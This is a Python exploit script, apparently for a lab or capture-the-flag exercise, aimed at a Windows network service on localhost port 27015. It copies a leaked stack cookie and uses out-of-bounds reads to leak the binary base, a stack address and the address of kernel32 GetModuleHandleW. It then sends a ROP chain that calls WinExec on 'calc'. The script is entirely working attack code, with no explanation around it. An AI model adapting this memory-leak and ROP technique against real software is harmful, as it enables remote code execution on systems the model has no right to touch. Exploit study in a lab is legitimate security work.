import socket, struct, binascii, array, time, win32api

handle = win32api.GetModuleHandle("kernel32.dll")
gtMdlH = win32api.GetProcAddress(handle, "GetModuleHandleW")
winExec = win32api.GetProcAddress(handle, "WinExec")
winexec_offset = winExec - gtMdlH

p = lambda x : struct.pack("<L", x)
u = lambda x : struct.unpack("<I", x)

def signedHex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))


def hexIt(x):
	val = x
	val = binascii.unhexlify(val.encode("hex"))
	y = array.array('h', val)
	y.byteswap()
	val = u(val)
	val = val[0]
	return val

s = socket.create_connection(("127.0.0.1", 27015))
s.send("Hola loco ")
	
for i in range(4):
	time.sleep(1)
	print "[%d]" % i
	dat = s.recv(15)
	
	if i == 0:
		dat = dat[:4]
		cookie2 = dat
		print "[*] cookie to send: %s" %  dat.encode("hex")
		dat += p(0x0) + p(0xffffffd0)
	
	elif i == 1:
		bin_base = dat
		bin_base = hexIt(bin_base)
		bin_base &= 0xfff0000
		
		print "[*] Base address found @ 0x%x" % bin_base
		dat = cookie2
		dat += p(0x0) + p(0xffffffc0)
		
	elif i == 2:
		leak_stack = dat # we need to add 12 to be at the beguinning of buf
		leak_stack = hexIt(leak_stack)
		
		print"[*] Leak stack var @ 0x%x" % leak_stack
		leak_stack += 40
		print "[*] Predicted value of start of buf @ 0x%x" % leak_stack
		
		__GetModuleHandle = bin_base + 0x3000
		dat = cookie2
		dat += p(0x0)
		
		# TODO sometimes leak_stack is greater than __GetModuleHandle
		if __GetModuleHandle > leak_stack:
			print "Default"
			dat += p(__GetModuleHandle - leak_stack)
		else:
			print "Converting to signed"
			val = signedHex(__GetModuleHandle - leak_stack, 32)
			print val[:-1]
			dat += p(int(val[:-1],16))
		
	
	elif i == 3:
		GetModuleHandle = dat 
		GetModuleHandle = hexIt(GetModuleHandle)
		
		print"[*] kernle32.GetModuleHandleW @ 0x%x" % GetModuleHandle
		dat = cookie2
		dat += p(0x0) + p(0x0)
	
	else:
		dat = cookie2
		dat += p(0x0) + p(0x0)
		
	print "[+] sending: %s\n" % dat.encode("hex")
	s.send(dat)

	
i += 1
print "[%d]" % i
dat = s.recv(20)

print "[+] received: %s\n" % dat.encode("hex")
print "[*] cookie to send: %s\n" % dat.encode("hex")

dat = cookie2 + p(0x200) + p(0x00000208) 
print "[+] sending: %s" % dat.encode("hex")
s.send(dat)


i += 1
time.sleep(1)
print "[%d]" % i
dat = s.recv(16)

print "[+] received: %s\n" % dat.encode("hex")
print dat.encode("hex")
print "[*] cookie to send: %s\n" % dat.encode("hex")

payload =  p(bin_base + 0x208c)*10 				# ret sled
payload += p(bin_base + 0x1896)					# pop esi
payload += p(GetModuleHandle + winexec_offset)  # WinExec
payload += p(bin_base + 0x1636)					# call esi
payload += p(leak_stack + 0x620)				# ptr_calc
payload += "calc\x00\x00\x00\x00"*10			# calc\x00 spray

dat = cookie2 + payload
print "[+] sending: %s" % dat.encode("hex")
s.send(dat)


i+=1
time.sleep(1)
print "[%d]" % i
dat = s.recv(512)

print dat.encode("hex")
s.send("\x00"*50)